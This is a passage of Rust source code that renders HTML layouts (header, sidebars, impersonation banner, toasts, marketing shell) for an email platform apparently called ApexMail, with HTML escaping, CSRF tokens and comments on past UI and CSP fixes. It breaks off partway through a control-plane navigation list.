use crate::icons::{render_icon, IconRenderOptions};

/// Escape HTML special characters to prevent XSS in rendered shell output.
pub fn html_escape(s: &str) -> String {
    let mut escaped = String::with_capacity(s.len());
    for c in s.chars() {
        match c {
            '&' => escaped.push_str("&amp;"),
            '<' => escaped.push_str("&lt;"),
            '>' => escaped.push_str("&gt;"),
            '"' => escaped.push_str("&quot;"),
            '\'' => escaped.push_str("&#x27;"),
            _ => escaped.push(c),
        }
    }
    escaped
}

pub struct ShellSpec {
    pub name: &'static str,
    pub contract_id: &'static str,
    pub status: &'static str,
}

pub const SHELLS: &[ShellSpec] = &[
    ShellSpec {
        name: "WebDashboardShell",
        contract_id: "shell/web-dashboard",
        status: "implemented",
    },
    ShellSpec {
        name: "ControlPlaneShell",
        contract_id: "shell/control-plane",
        status: "implemented",
    },
];

const WEB_LAYOUT_SOURCE: &str = include_str!("../baselines/web/dashboard-layout.baseline.txt");
const WEB_SIDEBAR_SOURCE: &str = include_str!("../baselines/web/sidebar.baseline.txt");
const WEB_HEADER_SOURCE: &str = include_str!("../baselines/web/header.baseline.txt");
const WEB_IMPERSONATION_SOURCE: &str =
    include_str!("../baselines/web/impersonation-banner.baseline.txt");
const WEB_TOAST_STORE_SOURCE: &str = include_str!("../baselines/web/use-toast.baseline.txt");
const CONTROL_PLANE_SHELL_SOURCE: &str =
    include_str!("../baselines/control-plane/control-plane-shell.baseline.txt");
const CONTROL_PLANE_SIDEBAR_SOURCE: &str =
    include_str!("../baselines/control-plane/sidebar.baseline.txt");

pub fn ui_store_persistence_key() -> &'static str {
    "apexmail-ui"
}

pub fn toast_store_global() -> &'static str {
    "__apexmailToastStore__"
}

pub fn toast_remove_delay_ms() -> usize {
    5_000
}

pub fn header_shortcut_hint() -> &'static str {
    "Search"
}

pub fn theme_storage_key() -> &'static str {
    "apexmail-ui:theme"
}

fn shell_icon(name: &str, class_name: &str) -> String {
    render_icon(
        name,
        IconRenderOptions {
            size: 18,
            stroke_width: 2.0,
            class_name: Some(class_name),
        },
    )
    .unwrap_or_default()
}

// ── Content-Security-Policy ──────────────────────────────────────────────
// NOTE: this crate intentionally defines NO CSP constant. Former members
// `shell_csp_header()` / `render_csp_meta_tag()` advertised a permissive
// policy (`script-src 'self' 'strict-dynamic'`, `style-src 'unsafe-inline'`,
// `img-src https:`) that contradicted the actually-served policy and was a
// trap for anyone wiring the "foundation" CSP in good faith (audit SM11 F5).
// The one CSP source of truth is the api-server:
//   services/mail-server/crates/api-server/src/app.rs
// (`browser_csp_header_with_sources` — serves `script-src 'none'` on every
// web/control-plane surface). Marketing-site CSP copies live in
// apps/marketing-zola/static/_headers + nginx.conf (+ the deploy/nginx edge
// vhost), kept in lockstep.

pub fn shell_source_catalog() -> [(&'static str, &'static str); 7] {
    [
        ("web_layout", WEB_LAYOUT_SOURCE),
        ("web_sidebar", WEB_SIDEBAR_SOURCE),
        ("web_header", WEB_HEADER_SOURCE),
        ("web_impersonation_banner", WEB_IMPERSONATION_SOURCE),
        ("web_toast_store", WEB_TOAST_STORE_SOURCE),
        ("control_plane_shell", CONTROL_PLANE_SHELL_SOURCE),
        ("control_plane_sidebar", CONTROL_PLANE_SIDEBAR_SOURCE),
    ]
}

/// Session identity rendered in the shell header. `None` renders NO plan
/// label and omits the identity block — a caller without session data must
/// never fabricate one (the old hardcoded "Free Plan — 30K / mo" label was
/// shown to paying customers on every console page; dogfood 2026-10-06). An
/// empty `plan_label` inside `Some` likewise renders no label.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct UserContext<'a> {
    pub display_name: &'a str,
    pub email: &'a str,
    pub plan_label: &'a str,
}

/// Session identity for the shell header, derived server-side from the
/// authenticated session (display name, email, plan label). The avatar
/// fallback is computed from the display name's initials.
pub fn avatar_initials(display_name: &str) -> String {
    let initials: String = display_name
        .split_whitespace()
        .filter(|part| !part.is_empty())
        .take(2)
        .map(|part| part.chars().next().unwrap_or('?').to_ascii_uppercase())
        .collect();
    if initials.is_empty() {
        "AM".to_string()
    } else {
        initials
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ShellHeader<'a> {
    pub search_query: &'a str,
    pub unread_count: usize,
    pub avatar_fallback: &'a str,
    pub mobile_menu_open: bool,
    pub user_context: Option<UserContext<'a>>,
}

impl<'a> ShellHeader<'a> {
    pub fn render_html(&self) -> String {
        let safe_avatar = html_escape(self.avatar_fallback);
        let user = self.user_context.as_ref();
        let display_name = html_escape(user.map_or("ApexMail User", |u| u.display_name));
        let email = html_escape(user.map_or("", |u| u.email));
        // No session (or an unresolved plan) renders NO plan label: the real
        // plan comes from the session, and a fabricated "Free Plan — 30K / mo"
        // on every authenticated page was the defect (dogfood 2026-10-06).
        let plan_label = user.map(|u| html_escape(u.plan_label)).unwrap_or_default();
        // The plan label is secondary: below `lg` the header keeps the
        // identity instead of squeezing both (live dogfood 2026-10-06
        // ui-visual: at 768 px a real plan label + email overflowed the
        // viewport by 19 px).
        let plan_label_block = if plan_label.is_empty() {
            String::new()
        } else {
            format!(
                "<div class=\"hidden lg:flex items-center gap-1 pr-4 border-r border-surface-100\" data-plan-label>\
                    <span class=\"text-[10px] font-semibold tracking-wide text-surface-500\">{plan_label}</span>\
                </div>"
            )
        };
        // The identity texts truncate instead of pushing the header wider: a
        // real session email is longer than any fixture placeholder, and the
        // flex chain needs `min-w-0` at every level for the ellipsis to
        // engage (live dogfood 2026-10-06 ui-visual, 768 px).
        let identity_block = if user.is_some() {
            format!(
                "<div class=\"text-right hidden sm:block min-w-0\">\
                    <p class=\"text-xs font-semibold text-surface-950 truncate\">{display_name}</p>\
                    <p class=\"text-[10px] font-medium text-surface-500 truncate\">{email}</p>\
                </div>"
            )
        } else {
            String::new()
        };

        format!(
            "<header class=\"apex-console-header sticky top-0 z-20 flex h-16 items-center justify-between border-b border-surface-200/60 bg-card px-8\">\
                <div class=\"flex items-center gap-4\">\
                    {mobile_toggle}\
                    <form method=\"get\" action=\"/campaigns\" role=\"search\" class=\"relative hidden md:block\">\
                        <label class=\"sr-only\" for=\"global-search\">Search campaigns</label>\
                        <div class=\"flex items-center gap-2 px-3 py-1.5 text-xs font-medium text-surface-500 bg-surface-50 border border-surface-200/60 rounded-[16px_16px_9px_9px] focus-within:border-primary min-w-[220px]\">\
                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"14\" height=\"14\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2.5\" stroke-linecap=\"round\" stroke-linejoin=\"round\" aria-hidden=\"true\"><circle cx=\"11\" cy=\"11\" r=\"8\"/><path d=\"m21 21-4.3-4.3\"/></svg>\
                            <input id=\"global-search\" type=\"search\" name=\"query\" placeholder=\"Search campaigns…\" class=\"bg-transparent outline-none text-surface-600 placeholder:text-muted-foreground w-full\" />\
                            <button type=\"submit\" class=\"text-[10px] font-bold uppercase tracking-widest text-surface-500 hover:text-surface-900 transition-colors\">Search</button>\
                        </div>\
                    </form>\
                </div>\
                <div class=\"flex items-center gap-4 min-w-0\">\
                    {plan_label_block}\
                    <div class=\"flex items-center gap-3 pl-2 min-w-0\">\
                        {identity_block}\
                        <div class=\"apex-avatar relative flex shrink-0 h-9 w-9 rounded-full bg-primary/10 border border-primary/20 items-center justify-center\" aria-label=\"Signed in as {avatar}\">\
                            <span class=\"text-brand-700 font-semibold text-xs tracking-tighter\">{avatar}</span>\
                        </div>\
                    </div>\
                </div>\
            </header>",
            mobile_toggle = shell_icon("menu", "h-5 w-5"),
            plan_label_block = plan_label_block,
            identity_block = identity_block,
            avatar = safe_avatar,
        )
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ImpersonationBanner<'a> {
    pub tenant_id: &'a str,
    pub operator_name: &'a str,
    pub time_remaining: &'a str,
    pub end_session_error: Option<&'a str>,
    pub ending_session: bool,
}

impl<'a> ImpersonationBanner<'a> {
    pub fn render_html(&self) -> String {
        let error = self
            .end_session_error
            .map(|value| {
                format!(
                    "<span class=\"text-[11px] font-semibold text-white tracking-tight\">{}</span>",
                    html_escape(value)
                )
            })
            .unwrap_or_default();
        let safe_tenant = html_escape(self.tenant_id);
        let safe_operator = html_escape(self.operator_name);
        let safe_time = html_escape(self.time_remaining);
        format!(
            "<div class=\"fixed top-0 left-0 right-0 z-[100] bg-primary text-white border-b border-brand-700\" role=\"alert\" aria-live=\"polite\"><div class=\"max-w-7xl mx-auto px-6 py-2\"><div class=\"flex items-center justify-between\"><div class=\"flex items-center gap-6\"><div class=\"flex items-center gap-2 bg-white/10 px-2 py-0.5 rounded-full\"><span class=\"text-[10px] font-semibold uppercase tracking-[0.1em]\">Impersonation Active</span></div><div class=\"flex items-center gap-2 text-[11px] font-semibold tracking-tight\"><span class=\"opacity-70\">Tenant:</span><span class=\"bg-white/10 px-1.5 py-0.5 rounded-[8px_8px_7px_7px]\">{}</span></div><div class=\"hidden md:flex items-center gap-2 text-[11px] font-semibold tracking-tight\"><span class=\"opacity-70\">Operator:</span><span>{}</span></div></div><div class=\"flex items-center gap-6\">{}<div class=\"flex items-center gap-2 text-[11px] font-semibold tracking-tight\"><span class=\"opacity-70\">Expires:</span><span class=\"font-mono bg-white/20 px-1.5 py-0.5 rounded-[8px_8px_7px_7px]\">{}</span></div><form method=\"POST\" action=\"/web/auth/impersonate/end\" class=\"inline\"><button type=\"submit\" class=\"px-3 py-1 bg-white text-primary rounded-[8px_8px_7px_7px] text-[11px] font-semibold hover:bg-surface-50 transition-colors\">{}</button></form></div></div></div></div>",
            safe_tenant,
            safe_operator,
            error,
            safe_time,
            if self.ending_session { "Ending..." } else { "Terminate" },
        )
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ToastSurface<'a> {
    pub toasts: Vec<&'a str>,
}

impl<'a> ToastSurface<'a> {
    pub fn render_html(&self) -> String {
        format!(
            "<section aria-label=\"Toast notifications\" data-toast-store=\"{}\" data-remove-delay=\"{}\"><div role=\"region\" aria-live=\"polite\" aria-label=\"Notifications\" class=\"fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]\">{}</div></section>",
            toast_store_global(),
            toast_remove_delay_ms(),
            self.toasts.join(""),
        )
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WebDashboardShell<'a> {
    pub sidebar_collapsed: bool,
    pub mobile_menu_open: bool,
    pub child_html: &'a str,
    pub header: ShellHeader<'a>,
    pub impersonation_banner: Option<ImpersonationBanner<'a>>,
    pub toast_surface: Option<ToastSurface<'a>>,
    pub current_path: &'a str,
    /// CSRF token for the sign-out form (native POST; injected by the
    /// axum_router render pass).
    pub csrf_token: &'a str,
}

impl<'a> WebDashboardShell<'a> {
    pub fn render_html(&self) -> String {
        let sidebar_width = if self.sidebar_collapsed {
            "w-20"
        } else {
            "w-64"
        };
        let banner = self
            .impersonation_banner
            .as_ref()
            .map(ImpersonationBanner::render_html)
            .unwrap_or_default();
        let toast_surface = self
            .toast_surface
            .as_ref()
            .map(ToastSurface::render_html)
            .unwrap_or_default();
        let sidebar_content = render_web_sidebar(self.current_path, self.csrf_token);
        // Zero-JS mobile navigation: a <details> disclosure. It is keyboard
        // operable, focusable, and needs no script to open or close.
        let menu_icon = shell_icon("menu", "h-5 w-5");
        let mobile_sidebar = format!(
            "<details class=\"apex-mobile-nav md:hidden\" id=\"mobile-sidebar\">\
            <summary class=\"fixed left-4 top-3 z-50 inline-flex h-10 w-10 items-center justify-center rounded-[16px_16px_9px_9px] bg-card text-surface-500 hover:bg-surface-50 hover:text-surface-950 transition-colors border border-surface-200\" aria-label=\"Toggle navigation menu\" aria-controls=\"mobile-sidebar-panel\">{menu_icon}<span class=\"sr-only\">Menu</span></summary>\
            <div id=\"mobile-sidebar-panel\" class=\"apex-mobile-nav-panel\">{sidebar_content}</div>\
            </details>",
            menu_icon = menu_icon,
        );

        format!(
            "<div class=\"apex-console-shell min-h-screen bg-background flex\" data-theme-storage-key=\"{theme_key}\">\
            {banner}\
            <aside class=\"hidden md:flex flex-col fixed left-0 top-0 h-screen {sidebar_width} z-30 transition-all duration-300\" data-sidebar-storage-key=\"{sidebar_key}\" aria-label=\"Primary sidebar navigation\">\
                {sidebar_content}\
            </aside>\
            {mobile_sidebar}\
            <div class=\"flex-1 flex flex-col min-h-screen min-w-0 transition-all duration-300 ml-0 md:ml-{ml_val}\"{impersonation_offset}>\
                {header}\
                <main class=\"apex-console-main relative p-6 lg:p-10 flex-1\" id=\"app-main\">\
                    <div class=\"max-w-7xl mx-auto\">\
                        {child_html}\
                    </div>\
                </main>\
            </div>\
            {toast_surface}\
            </div>",
            theme_key = theme_storage_key(),
            banner = banner,
            sidebar_width = sidebar_width,
            sidebar_key = ui_store_persistence_key(),
            sidebar_content = sidebar_content,
            mobile_sidebar = mobile_sidebar,
            ml_val = if self.sidebar_collapsed { "20" } else { "64" },
            // The impersonation banner is a fixed overlay (~2.1rem tall):
            // push the whole column — including the sticky header — below
            // it so the page title is not clipped (design report item 25).
            impersonation_offset = if self.impersonation_banner.is_some() {
                " style=\"padding-top: 2.1rem\""
            } else {
                ""
            },
            header = self.header.render_html(),
            child_html = self.child_html,
            toast_surface = toast_surface,
        )
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct OperationalBanner<'a> {
    pub tone: &'a str,
    pub message: &'a str,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ControlPlaneShell<'a> {
    pub mobile_menu_open: bool,
    pub user_role: &'a str,
    /// Chrome title in the sticky header. Rendered as a styled `<p>`, NOT an
    /// `<h1>`: the page content renders the document's single `<h1>`
    /// (batch-2 one-h1-per-page fix).
    pub page_title: &'a str,
    pub page_description: &'a str,
    pub banners: Vec<OperationalBanner<'a>>,
    pub child_html: &'a str,
    pub current_path: &'a str,
    /// CSRF token for the sign-out form (native POST).
    pub csrf_token: &'a str,
    /// Session identity for the CP header (operator display name, email, and
    /// the tenant's REAL plan label). `None` renders NO plan label and no
    /// identity block — a render without session data must never fabricate
    /// one (dogfood 2026-10-08 F10: the CP render pipeline loaded
    /// `session_identity` but the layout consumed only the role placeholder,
    /// so CP pages showed no plan label while the web console did).
    pub user_context: Option<UserContext<'a>>,
}

impl<'a> ControlPlaneShell<'a> {
    pub fn render_html(&self) -> String {
        let banner_markup = self
            .banners
            .iter()
            .map(|banner| {
                format!(
                    "<div class=\"px-6 py-2 text-[11px] font-semibold tracking-tight border-b border-white/10 {}\">{}</div>",
                    control_plane_banner_class(banner.tone),
                    html_escape(banner.message)
                )
            })
            .collect::<Vec<_>>()
            .join("");

        let sidebar_content = render_cp_sidebar(self.current_path, self.csrf_token);
        let menu_icon = shell_icon("menu", "h-5 w-5");

        // Session identity in the CP header (F10): the real plan label and
        // the operator's name/email, resolved server-side and never
        // fabricated. With no session both blocks render empty — the wrapper
        // stays so the header layout is identical across renders.
        let plan_label = self
            .user_context
            .as_ref()
            .map(|user| html_escape(user.plan_label))
            .unwrap_or_default();
        let plan_label_block = if plan_label.is_empty() {
            String::new()
        } else {
            format!(
                "<div class=\"hidden lg:flex items-center gap-1 pr-4 border-r border-surface-100\" data-plan-label>\
                    <span class=\"text-[10px] font-semibold tracking-wide text-surface-500\">{plan_label}</span>\
                </div>"
            )
        };
        let identity_block = match self.user_context.as_ref() {
            Some(user) => format!(
                "<div class=\"text-right hidden sm:block min-w-0\" data-user-identity>\
                    <p class=\"text-xs font-semibold text-surface-950 truncate\">{display_name}</p>\
                    <p class=\"text-[10px] font-medium text-surface-500 truncate\">{email}</p>\
                </div>",
                display_name = html_escape(user.display_name),
                email = html_escape(user.email),
            ),
            None => String::new(),
        };
        let mobile_sidebar = format!(
            "<details class=\"apex-mobile-nav md:hidden fixed inset-y-0 left-0 z-50\" id=\"control-plane-mobile-sidebar\">\
            <summary class=\"absolute left-4 top-3 z-10 inline-flex h-10 w-10 items-center justify-center rounded-[16px_16px_9px_9px] bg-card text-surface-500 hover:bg-surface-50 hover:text-surface-950 transition-colors border border-surface-200\" aria-label=\"Toggle control plane navigation menu\" aria-controls=\"control-plane-mobile-panel\">{menu_icon}<span class=\"sr-only\">Menu</span></summary>\
            <div id=\"control-plane-mobile-panel\" class=\"h-screen w-full bg-card border-r border-surface-200/60 overflow-y-auto pt-16\">{sidebar_content}</div>\
            </details>",
            menu_icon = menu_icon,
        );

        format!(
            "<div class=\"apex-cp-shell min-h-screen bg-background flex\" data-theme-storage-key=\"{theme_key}\">\
            <aside class=\"hidden md:flex flex-col fixed left-0 top-0 h-screen w-64 z-30\" data-user-role=\"{role}\">\
                {sidebar_content}\
            </aside>\
            {mobile_sidebar}\
            <div class=\"flex-1 flex flex-col min-h-screen min-w-0 ml-0 md:ml-64\"{banner_offset}>\
                {banner_markup}\
                <header class=\"h-16 border-b border-surface-200/60 bg-card flex items-center justify-between px-8 sticky top-0 z-20\">\
                    <div class=\"flex items-baseline gap-3 min-w-0\">\
                        <p class=\"text-lg font-bold text-surface-950 tracking-tight\">{page_title}</p>\
                        <p class=\"hidden sm:block text-xs font-medium text-surface-500 truncate\">{page_description}</p>\
                    </div>\
                    <div class=\"flex items-center gap-4 min-w-0\">{plan_label_block}{identity_block}</div>\
                </header>\
                <main class=\"p-8 flex-1\" id=\"app-main\">\
                    <div class=\"max-w-7xl mx-auto\">\
                        {child_html}\
                    </div>\
                </main>\
            </div>\
            </div>",
            theme_key = theme_storage_key(),
            role = html_escape(self.user_role),
            sidebar_content = sidebar_content,
            mobile_sidebar = mobile_sidebar,
            banner_offset = if self.banners.is_empty() {
                String::new()
            } else {
                // Fixed operational banners overlap the sticky header —
                // push the scroll container down by the banner stack height
                // (each banner renders at ~2rem of chrome).
                format!(" style=\"padding-top: {}rem\"", self.banners.len() * 2)
            },
            banner_markup = banner_markup,
            page_title = html_escape(self.page_title),
            page_description = html_escape(self.page_description),
            child_html = self.child_html,
            plan_label_block = plan_label_block,
            identity_block = identity_block,
        )
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MarketingShell<'a> {
    pub child_html: &'a str,
}

fn render_marketing_header() -> String {
    "<header id=\"site-header\" data-marketing-shell=\"header\" class=\"fixed top-0 left-0 right-0 z-50 transition-all duration-300 bg-transparent border-b border-transparent\">\
         <nav class=\"max-w-7xl mx-auto px-4 sm:px-6 lg:px-8\">\
         <div class=\"flex items-center justify-between h-16 lg:h-20\">\
         <a href=\"/\" class=\"flex items-center gap-2 group\">\
         <div class=\"w-8 h-8 rounded-[8px_8px_7px_7px] bg-surface-950 flex items-center justify-center border border-surface-800\">\
         <svg xmlns=\"http://www.w3.org/2000/svg\" class=\"w-5 h-5 text-white\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><polygon points=\"13 2 3 14 12 14 11 22 21 10 12 10 13 2\"/></svg>\
         </div><span class=\"text-xl font-bold text-surface-950 tracking-tighter\">ApexMail</span></a>\
         <div class=\"hidden lg:flex items-center gap-6\">\
         <a href=\"/features\" class=\"text-sm font-semibold text-surface-600 hover:text-surface-950\">Features</a>\
         <a href=\"/pricing\" class=\"text-sm font-semibold text-surface-600 hover:text-surface-950\">Pricing</a>\
         <a href=\"/docs\" class=\"text-sm font-semibold text-surface-600 hover:text-surface-950\">Docs</a>\
         </div>\
         <div class=\"flex items-center gap-3\">\
         <a href=\"/login\" class=\"text-sm font-semibold text-surface-600 px-3 py-2\">Login</a>\
         <a href=\"/signup\" class=\"btn-primary px-4 py-2 text-sm font-semibold\">Get Started</a>\
         </div></div></nav></header>"
        .to_string()
}

fn render_marketing_footer() -> String {
    "<footer data-marketing-shell=\"footer\" class=\"bg-surface-950 text-white py-12\">\
         <div class=\"max-w-7xl mx-auto px-4 sm:px-6 lg:px-8\">\
         <div class=\"grid grid-cols-2 md:grid-cols-4 gap-8 mb-12\">\
         <div><h4 class=\"text-[11px] font-semibold uppercase tracking-[0.1em] mb-6 opacity-40\">Product</h4><ul class=\"space-y-4 text-sm text-surface-500\"><li><a href=\"/features\">Features</a></li><li><a href=\"/pricing\">Pricing</a></li></ul></div>\
         <div><h4 class=\"text-[11px] font-semibold uppercase tracking-[0.1em] mb-6 opacity-40\">Platform</h4><ul class=\"space-y-4 text-sm text-surface-500\"><li><a href=\"/docs\">API</a></li><li><a href=\"/status\">Status</a></li></ul></div>\
         <div><h4 class=\"text-[11px] font-semibold uppercase tracking-[0.1em] mb-6 opacity-40\">Legal</h4><ul class=\"space-y-4 text-sm text-surface-500\"><li><a href=\"/privacy\">Privacy</a></li><li><a href=\"/terms\">Terms</a></li></ul></div>\
         <div><h4 class=\"text-[11px] font-semibold uppercase tracking-[0.1em] mb-6 opacity-40\">Company</h4><ul class=\"space-y-4 text-sm text-surface-500\"><li><a href=\"/about\">About</a></li><li><a href=\"/contact\">Contact</a></li></ul></div>\
         </div><div class=\"pt-8 border-t border-white/5 flex flex-col md:flex-row justify-between items-center gap-4 text-[11px] text-surface-500 font-medium\">\
         <p>© 2026 APEXMAIL TECH LTD. ALL RIGHTS RESERVED.</p><div class=\"flex gap-6\"><a href=\"#\">Twitter</a><a href=\"#\">GitHub</a></div>\
         </div></div></footer>"
        .to_string()
}

impl<'a> MarketingShell<'a> {
    pub fn render_html(&self) -> String {
        format!(
            "<div class=\"font-apex antialiased text-[17px] leading-[1.6] min-h-screen safe-area-inset-bottom flex flex-col\">{}<main class=\"flex-1 pt-16 lg:pt-20\">{}</main>{}<div data-marketing-shell=\"cookie-consent\"></div><button data-marketing-shell=\"back-to-top\"></button></div>",
            render_marketing_header(),
            self.child_html,
            render_marketing_footer(),
        )
    }
}

fn control_plane_banner_class(tone: &str) -> &'static str {
    match tone {
        "critical" => "bg-destructive/10 text-destructive border-destructive/20",
        "warning" => "border-warning/20 bg-warning/10 text-warning",
        _ => "bg-primary/10 text-primary border-primary/20",
    }
}

fn render_sidebar_content(
    items: &[(&str, &str, &str)],
    _link_classes: &str,
    current_path: &str,
) -> String {
    let links = items
        .iter()
        .map(|(label, href, icon_name)| {
            let icon = shell_icon(icon_name, "h-4 w-4");
            let is_active = current_path == *href
                || (href != &"/" && current_path.starts_with(href))
                || (href == &"/dashboard" && (current_path == "/" || current_path == "/cp" || current_path == "/dashboard"));
            let active_class = " aria-current=\"page\"";

            // CONCENTRIC (mark DNA): the active cell is solid + an outer
            // ring — the spiral's two arms (apex-nav-cell in globals.css).
            let classes = if is_active {
                "apex-nav-cell is-active flex items-center gap-3 px-3 py-2 text-sm font-semibold transition-all bg-primary text-white"
            } else {
                "flex items-center gap-3 px-3 py-2 text-sm font-medium transition-all rounded-[8px_8px_7px_7px] text-surface-600 hover:text-surface-950 hover:bg-surface-50"
            };

            let icon_color = if is_active { "text-brand-700" } else { "text-surface-500" };
            let icon_wrap = format!(
                "<span class=\"w-5 h-5 flex items-center justify-center transition-colors {}\">{}</span>",
                icon_color, icon
            );
            format!(
                "<a href=\"{}\" class=\"{}\"{}>{}{}</a>",
                href,
                classes,
                if is_active { active_class } else { "" },
                icon_wrap,
                label,
            )
        })
        .collect::<Vec<_>>()
        .join("");
    format!(
        "<div class=\"flex flex-col gap-1 px-3 py-2\">{}</div>",
        links
    )
}

fn render_web_sidebar(current_path: &str, csrf_token: &str) -> String {
    // Task-oriented IA (design report item 4): every routed page is
    // reachable from the nav — Reports, Inbox Placement, Events, and
    // Dedicated IPs were previously rendered-but-unreachable orphans.
    let overview_items = [("Dashboard", "/dashboard", "home")];
    let send_items = [
        ("Campaigns", "/campaigns", "mail"),
        ("Templates", "/templates", "layout-template"),
        ("Contacts", "/contacts", "users"),
        ("Lists", "/lists", "list"),
    ];
    let measure_items = [
        ("Analytics", "/analytics", "bar-chart-3"),
        ("Reports", "/reports", "file-text"),
        ("Inbox Placement", "/inbox-placement", "inbox"),
        ("Events", "/events", "activity"),
    ];
    let configure_items = [
        ("Domains", "/domains", "globe"),
        ("API Keys", "/settings/api-keys", "key"),
        ("Webhooks", "/settings/webhooks", "zap"),
        ("Dedicated IPs", "/settings/dedicated-ips", "server"),
        // Deferred-feature 4: the suppression list joins the Configure group
        // (read-only — compliance flows own the writes).
        ("Suppressions", "/settings/suppressions", "ban"),
    ];
    let account_items = [
        // SalesCloser plan §5.2: the console assistant lives with the
        // account surfaces (it answers questions about this workspace).
        ("Assistant", "/assistant", "message-square"),
        ("Billing", "/settings/billing", "credit-card"),
        ("Settings", "/settings", "settings"),
    ];

    let render_section = |title: &str, items: &[(&str, &str, &str)]| {
        format!(
            "<div class=\"space-y-1 mb-6\">\
                <h3 class=\"px-6 text-[11px] font-semibold uppercase tracking-[0.1em] text-surface-500 mb-2\">{}</h3>\
                {}</div>",
            title,
            render_sidebar_content(items, "", current_path)
        )
    };

    let content = format!(
        "{}{}{}{}{}",
        render_section("Overview", &overview_items),
        render_section("Send", &send_items),
        render_section("Measure", &measure_items),
        render_section("Configure", &configure_items),
        render_section("Account", &account_items),
    );

    format!(
        "<div class=\"apex-console-sidebar flex flex-col h-full bg-card text-surface-900 border-r border-surface-200/60 transition-all w-64\">\
         <div class=\"p-6 mb-4\"><div class=\"flex items-center gap-2\">\
         <span class=\"apex-sidebar-brand text-xl font-bold tracking-tighter transition-all hover:opacity-80\"><span class=\"text-brand-600\">Apex</span><span class=\"text-surface-950\">Mail</span></span></div></div>\
         <nav class=\"flex-1 overflow-y-auto\" data-sidebar=\"primary\" aria-label=\"Primary sidebar navigation\">{content}</nav>\
         <div class=\"p-4 border-t border-surface-100\"><form method=\"POST\" action=\"/web/auth/logout\"><input type=\"hidden\" name=\"_csrf\" value=\"{csrf_token}\" /><button type=\"submit\" class=\"flex w-full items-center gap-3 px-4 py-2 text-sm font-semibold rounded-[8px_8px_7px_7px] text-surface-500 hover:text-surface-950 hover:bg-surface-50 transition-colors\"><span>Sign Out</span></button></form></div></div>",
        content = content,
        csrf_token = html_escape(csrf_token),
    )
}

/// Overlay the AUTHENTICATED CP operator role onto an already-rendered
/// control-plane document.
///
/// The CP page layout pins `data-user-role` to a hardcoded `"admin"`
/// placeholder; the api-server request pipeline knows the verified CP claim
/// role and calls this on the rendered HTML, so the shell reflects the real
/// owner/admin distinction instead of a constant. The role is HTML-escaped,
/// so a hostile value cannot break out of the attribute.
pub fn apply_control_plane_role(html: &str, role: &str) -> String {
    if role.is_empty() {
        return html.to_string();
    }
    html.replace(
        "data-user-role=\"admin\"",
        &format!("data-user-role=\"{}\"", html_escape(role)),
    )
}

/// Inject the impersonation banner into an already-rendered control-plane
/// document.
///
/// [`ControlPlaneShell`] has no banner slot of its own; the banner (which is
/// `position: fixed`) is inserted as the first child of the shell root and
/// the scroll column is pushed down by its rendered height (~2.1rem) so the
/// sticky header is not clipped — the same offset the web shell applies
/// natively. Used by the SSR request path whenever the request carries a
/// verified impersonation cookie (dogfood 2026-10-06: the banner component
/// existed but no request path ever rendered it, so an operator had no UI
/// way to end an impersonation session).
///
/// Structural no-op when the document is not a CP shell.
pub fn apply_control_plane_impersonation_banner(
    html: &str,
    banner: &ImpersonationBanner<'_>,
) -> String {
    const SHELL_ANCHOR: &str = "<div class=\"apex-cp-shell min-h-screen bg-background flex\"";
    let Some(shell_start) = html.find(SHELL_ANCHOR) else {
        return html.to_string();
    };
    let Some(tag_len) = html[shell_start..].find('>') else {
        return html.to_string();
    };
    let insert_at = shell_start + tag_len + 1;
    let mut out = String::with_capacity(html.len() + 1024);
    out.push_str(&html[..insert_at]);
    out.push_str(&banner.render_html());
    out.push_str(&offset_cp_scroll_column(&html[insert_at..]));
    out
}

/// Push the CP scroll column below the fixed impersonation banner,
/// preserving any operational-banner offset the shell already applied.
fn offset_cp_scroll_column(html: &str) -> String {
    const CLASS_ATTR: &str = "class=\"flex-1 flex flex-col min-h-screen min-w-0 ml-0 md:ml-64\"";
    const STYLE_PREFIX: &str = " style=\"padding-top: ";
    const REM: &str = "rem\"";
    let Some(class_pos) = html.find(CLASS_ATTR) else {
        return html.to_string();
    };
    let after_class = class_pos + CLASS_ATTR.len();
    if let Some(style_rest) = html[after_class..].strip_prefix(STYLE_PREFIX) {
        if let Some(rel_end) = style_rest.find(REM) {
            let value_start = after_class + STYLE_PREFIX.len();
            let value_end = value_start + rel_end;
            let current: f64 = html[value_start..value_end].trim().parse().unwrap_or(0.0);
            let mut out = String::with_capacity(html.len() + 16);
            out.push_str(&html[..value_start]);
            // One decimal: avoids the 2.0+2.1 = 4.1000000000000005 f64
            // representation leaking into the style attribute.
            out.push_str(&format!("{:.1}", current + 2.1));
            out.push_str(&html[value_end..]);
            return out;
        }
    }
    let mut out = String::with_capacity(html.len() + 32);
    out.push_str(&html[..after_class]);
    out.push_str(STYLE_PREFIX);
    out.push_str("2.1");
    out.push_str(REM);
    out.push_str(&html[after_class..]);
    out
}

fn render_cp_sidebar(current_path: &str, csrf_token: &str) -> String {
    // Task-oriented regroup (design report structural #20): Operate /
    // Customers / Governance. Alerts — the most operational page — joins
    // the nav instead of living two clicks deep.
    let operate_items = [
        ("Overview", "/dashboard", "home"),
        ("Alerts", "/alerts", "bell"),
        ("Infrastructure", "/infrastructure", "server"),
        // Plan §7: the human review queue for AI-drafted replies.
        ("AI Drafts", "/reviews/ai-drafts", "sparkles"),
        ("Jobs", "/jobs", "clock"),
        ("Analytics", "/analytics", "bar-chart-3"),
    ];
    let customer_items = [
        ("Tenants", "/tenants", "building"),
        ("Domains", "/domains", "globe"),
        ("Sales Console", "/sales", "trending-up"),
        ("Discovery", "/discovery", "search"),
        // Plan §5.6: the demo presenter (owner-run walkthroughs).
        ("Demos", "/cp/demos", "presentation"),
    ];
    let governance_items = [
        ("Operators", "/operators", "users"),
